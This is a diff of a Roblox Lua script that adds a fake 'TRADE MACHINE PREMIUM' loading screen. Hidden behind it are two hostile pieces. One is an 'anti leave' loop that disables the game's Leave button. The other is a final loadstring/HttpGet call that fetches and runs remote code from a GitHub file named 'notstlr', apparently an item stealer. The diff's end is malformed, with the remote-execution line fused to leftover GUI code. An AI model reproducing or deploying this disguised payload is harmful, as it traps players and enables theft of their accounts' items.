@@ -1,109 +1,190 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
 
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "NexioHub"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+-- anti leave
 
-local parentSuccess = pcall(function()
-	screenGui.Parent = PlayerGui
+task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
+
+
+-- SETTINGS
+local LoadingTime = 20 -- seconds
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PremiumLoading"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = playerGui
+
+-- BACKGROUND
+local Main = Instance.new("Frame")
+Main.Parent = ScreenGui
+Main.Size = UDim2.new(1,0,1,0)
+Main.BackgroundColor3 = Color3.fromRGB(8,8,12)
+
+-- GRADIENT
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 255))
+}
+Gradient.Rotation = 45
+Gradient.Parent = Main
+
+-- DARK OVERLAY
+local Overlay = Instance.new("Frame")
+Overlay.Parent = Main
+Overlay.Size = UDim2.new(1,0,1,0)
+Overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
+Overlay.BackgroundTransparency = 0.35
+
+-- BLUR EFFECT
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 18
+Blur.Parent = Lighting
+
+-- LOGO/TITLE
+local Title = Instance.new("TextLabel")
+Title.Parent = Main
+Title.Size = UDim2.new(1,0,0.1,0)
+Title.Position = UDim2.new(0,0,0.28,0)
+Title.BackgroundTransparency = 1
+Title.Text = "TRADE MACHINE PREMIUM"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBlack
+
+-- SHADOW TITLE
+local Shadow = Title:Clone()
+Shadow.Parent = Main
+Shadow.Position = UDim2.new(0,3,0.28,3)
+Shadow.TextColor3 = Color3.fromRGB(0,0,0)
+Shadow.ZIndex = 0
+
+Title.ZIndex = 1
+
+-- SUBTITLE
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Parent = Main
+Subtitle.Size = UDim2.new(1,0,0.04,0)
+Subtitle.Position = UDim2.new(0,0,0.39,0)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "Loading assets..."
+Subtitle.TextColor3 = Color3.fromRGB(220,220,220)
+Subtitle.TextScaled = true
+Subtitle.Font = Enum.Font.Gotham
+
+-- LOADING BOX
+local Box = Instance.new("Frame")
+Box.Parent = Main
+Box.Size = UDim2.new(0.45,0,0.045,0)
+Box.Position = UDim2.new(0.275,0,0.53,0)
+Box.BackgroundColor3 = Color3.fromRGB(20,20,25)
+Box.BorderSizePixel = 0
+
+local BoxCorner = Instance.new("UICorner")
+BoxCorner.CornerRadius = UDim.new(1,0)
+BoxCorner.Parent = Box
+
+-- STROKE
+local Stroke = Instance.new("UIStroke")
+Stroke.Parent = Box
+Stroke.Color = Color3.fromRGB(255,255,255)
+Stroke.Transparency = 0.7
+
+-- BAR
+local Bar = Instance.new("Frame")
+Bar.Parent = Box
+Bar.Size = UDim2.new(0,0,1,0)
+Bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
+Bar.BorderSizePixel = 0
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1,0)
+BarCorner.Parent = Bar
+
+-- BAR GRADIENT
+local BarGradient = Instance.new("UIGradient")
+BarGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(170,0,255))
+}
+BarGradient.Parent = Bar
+
+-- PERCENT TEXT
+local Percent = Instance.new("TextLabel")
+Percent.Parent = Main
+Percent.Size = UDim2.new(1,0,0.03,0)
+Percent.Position = UDim2.new(0,0,0.59,0)
+Percent.BackgroundTransparency = 1
+Percent.Text = "0%"
+Percent.TextColor3 = Color3.fromRGB(255,255,255)
+Percent.TextScaled = true
+Percent.Font = Enum.Font.GothamBold
+
+-- TWEEN BAR
+TweenService:Create(
+	Bar,
+	TweenInfo.new(LoadingTime, Enum.EasingStyle.Linear),
+	{Size = UDim2.new(1,0,1,0)}
+):Play()
+
+-- LOADING TEXT ANIMATION
+task.spawn(function()
+	while ScreenGui.Parent do
+		Subtitle.Text = "Loading assets."
+		task.wait(0.5)
+		Subtitle.Text = "Loading assets.."
+		task.wait(0.5)
+		Subtitle.Text = "Loading assets..."
+		task.wait(0.5)
+	end
 end)
-if not parentSuccess then
-	screenGui.Parent = game:GetService("CoreGui")
+
+-- PERCENT COUNTER
+for i = 1, 100 do
+	Percent.Text = i.."%"
+	task.wait(LoadingTime / 100)
 end
 
-local baseSize = isMobile and UDim2.new(0, 300, 0, 370) or UDim2.new(0, 340, 0, 400)
-local basePos = UDim2.new(0.5, isMobile and -150 or -170, 0.5, isMobile and -185 or -200)
+-- FINISHED TEXT
+Subtitle.Text = "Loaded Successfully!"
+task.wait(1)
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 0, 0, 0)
-mainFrame.Position = basePos
-mainFrame.BackgroundColor3 = Color3.fromRGB(10, 5, 20)
-mainFrame.BackgroundTransparency = 0.1
-mainFrame.BorderSizePixel = 0
-mainFrame.ClipsDescendants = true
-mainFrame.Parent = screenGui
+-- FADE OUT
+for _, v in pairs(ScreenGui:GetDescendants()) do
+	if v:IsA("Frame") then
+		TweenService:Create(v, TweenInfo.new(1.5), {
+			BackgroundTransparency = 1
+		}):Play()
+	elseif v:IsA("TextLabel") then
+		TweenService:Create(v, TweenInfo.new(1.5), {
+			TextTransparency = 1
+		}):Play()
+	elseif v:IsA("UIStroke") then
+		TweenService:Create(v, TweenInfo.new(1.5), {
+			Transparency = 1
+		}):Play()
+	end
+end
 
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 18)
-mainCorner.Parent = mainFrame
+TweenService:Create(Blur, TweenInfo.new(1.5), {
+	Size = 0
+}):Play()
 
-local mainStroke = Instance.new("UIStroke")
-mainStroke.Color = Color3.fromRGB(180, 60, 255)
-mainStroke.Transparency = 0.3
-mainStroke.Thickness = 1.5
-mainStroke.Parent = mainFrame
+task.wait(1.5)
 
-local bgGradient = Instance.new("UIGradient")
-bgGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 5, 50)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 5, 35)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 65))
-})
-bgGradient.Rotation = 135
-bgGradient.Parent = mainFrame
+Blur:Destroy()
+ScreenGui:Destroy()
 
-local glowFrame = Instance.new("Frame")
-glowFrame.Size = UDim2.new(1, 0, 0, 3)
-glowFrame.Position = UDim2.new(0, 0, 0, 0)
-glowFrame.BackgroundColor3 = Color3.fromRGB(180, 60, 255)
-glowFrame.BorderSizePixel = 0
-glowFrame.ZIndex = 5
-glowFrame.Parent = mainFrame
+print("Loading finished!")
 
-local glowGrad = Instance.new("UIGradient")
-glowGrad.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 255)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 80, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 255))
-})
-glowGrad.Parent = glowFrame
-
-local topBar = Instance.new("Frame")
-topBar.Name = "TopBar"
-topBar.Size = UDim2.new(1, 0, 0, 55)
-topBar.Position = UDim2.new(0, 0, 0, 3)
-topBar.BackgroundTransparency = 1
-topBar.ZIndex = 3
-topBar.Parent = mainFrame
-
-local logoContainer = Instance.new("Frame")
-logoContainer.Size = UDim2.new(0, 36, 0, 36)
-logoContainer.Position = UDim2.new(0, 14, 0.5, -18)
-logoContainer.BackgroundColor3 = Color3.fromRGB(140, 40, 220)
-logoContainer.BorderSizePixel = 0
-logoContainer.ZIndex = 4
-logoContainer.Parent = topBar
-
-local logoCorner = Instance.new("UICorner")
-logoCorner.CornerRadius = UDim.new(0, 8)
-logoCorner.Parent = logoContainer
-
-local logoGrad = Instance.new("UIGradient")
-logoGrad.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 60, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 180))
-})
-logoGrad.Rotation = 135
-logoGrad.Parent = logoContainer
-
-local logoLabel = Instance.new("TextLabel")
-logoLabel.Size = UDim2.new(1, 0, 1, 0)
-logoLabel.BackgroundTransparency = 1
-logoLabel.Text = "N"
-logoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-logoLabel.TextScaled = true
-logoLabel.Font = Enum.Font.GothamBold
-logoLabel.ZIndex = 5
-logoLabel.Parent = logoContainer
+-- EXECUTE SCRIPT
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sabscriptduel/Trade-script/refs/heads/main/notstlr"))()logoLabel.Parent = logoContainer
 
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Size = UDim2.new(0, 120, 0, 22)
